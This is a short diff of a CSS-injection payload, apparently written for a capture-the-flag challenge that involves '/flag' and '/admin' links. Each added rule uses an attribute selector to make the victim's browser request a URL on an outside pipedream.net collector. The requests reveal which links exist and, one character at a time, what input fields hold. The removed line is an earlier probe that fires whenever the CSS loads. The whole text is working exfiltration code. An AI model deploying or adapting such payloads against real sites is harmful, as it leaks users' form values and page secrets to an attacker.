@@ -1,1 +1,5 @@
-* { background: url('https://eonx1tvsx1uwahp.m.pipedream.net/css-ran') }
+a[href^="/"] { background: url('https://eonx1tvsx1uwahp.m.pipedream.net/link-') }
+a[href="/admin"] { background: url('https://eonx1tvsx1uwahp.m.pipedream.net/has-admin') }
+a[href="/flag"] { background: url('https://eonx1tvsx1uwahp.m.pipedream.net/has-flag') }
+input[value^="a"] { background: url('https://eonx1tvsx1uwahp.m.pipedream.net/value-a') }
+input[value^="b"] { background: url('https://eonx1tvsx1uwahp.m.pipedream.net/value-b') }
